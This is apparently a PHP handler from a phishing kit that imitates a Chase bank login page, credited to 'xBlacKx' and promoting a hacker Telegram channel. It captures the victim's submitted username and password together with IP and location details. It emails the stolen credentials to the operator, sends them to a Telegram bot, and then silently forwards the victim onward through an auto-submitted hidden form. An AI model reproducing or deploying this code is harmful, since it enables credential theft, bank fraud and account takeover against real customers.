<?php
include "config.php";
include "Main.php";
include_once 'functions.php';
error_reporting(0);

$ip = getUserIP();

$subject = "💲CHASE LOGIN💲 [ ".$_POST['username']." ] [$cn - $ip]";
$msg = '
<b>=========[💲CHASE LOGIN💲]=========</b><br>
<p>
👤Username : '.$_POST['username'].'<br>
🔓Password : '.$_POST['password'].'<br>
<b>=========[💲DEVICE INFO💲]=========</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Curs : '.$kurenci.'<br>
OS / BR : '.$os.' / '.$br.'<br>
User Agent : '.$user_agent.'<br>
Timezone : '.$timezone.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
Date : '.$date.'<br>
<b>=========[ ♥️xBlacKx - CHASE♥️  ]=========</b>
</p>
';
$msgtg = '
*=========[💲CHASE LOGIN💲]=========*
*👤Username* : `'.$_POST['username'].'`
*🔓Password* : `'.$_POST['password'].'`
*=========[👁‍🗨DEVICE INFO👁‍🗨]=========*
*IP* : http://www.geoiptool.com/?IP='.$ip.'
*Date* : `'.$date.'`
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: ♥️xBlacKx♥️ <admin@xblackx.coder>' . "\r\n";
$kirim = mail($toEmail, $subject, $msg, $headers);
#Send To Telegram
if ($Telegram_Logs=="yes") {
	telegramBot('sendMessage', [
	  'chat_id' => TELEGRAM_BOT_ADMIN_USERID,
	  'text' => ($subject .$msgtg),
	  'parse_mode'=>'markdown',
	  'reply_markup'=>json_encode([
      'inline_keyboard'=>[
       [['text'=>"⚔️ ↝Channel↜ ⚔️", 'url'=>"https://t.me/Anonymous_Hackez_Channel"]],
       [['text'=>"⚔️ ↝Coder↜ ⚔️", 'url'=>"https://t.me/xblackx_Coder0"]],
      ]
              ])
              ]);
}
echo "<form id='xblackx' method='POST' action='../overview.php'><input type='hidden' name='username' value='".$_POST['username']."'><input type='hidden' name='password' value='".$_POST['password']."'></form><script type='text/javascript'>document.getElementById('xblackx').submit();</script>";
?>